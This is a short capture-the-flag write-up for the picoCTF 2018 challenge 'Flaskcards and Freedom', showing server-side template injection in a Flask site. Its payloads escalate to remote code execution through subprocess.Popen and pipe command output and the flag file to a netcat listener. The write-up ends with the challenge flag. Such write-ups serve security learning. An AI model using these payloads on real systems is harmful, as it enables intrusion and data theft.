> Flaskcards and Freedom - Points: 900 - (Solves: 150)
> There seem to be a few more files stored on the flash card server but we can't login. Can you? http://2018shell1.picoctf.com:56944 (link)

By testing around the website we find that it is vulnerable to template injection.

Some of the payloads showing it is possible to use template injection to exploit the site:
```
{{config}}

{{self}}

{{''.__class__.__mro__[1].__subclasses__()}}
```


Since we have access to classes, we're able to call subprocess.Popen to get remote code execution and execute code on the server. We use this to extract data over netcat.
To exploit, replace `0.0.0.0` with the ip of your listener.

```
# subrocess.Popen
{{''.__class__.__mro__[1].__subclasses__()[304]}}

{{''.__class__.__mro__[1].__subclasses__()[304]('ls | nc 0.0.0.0 4444', shell=True)}}


{{''.__class__.__mro__[1].__subclasses__()[304]('cat flag | nc 0.0.0.0 4444', shell=True)}}
```


Flag: `picoCTF{R_C_E_wont_let_me_be_85e92c3a}`


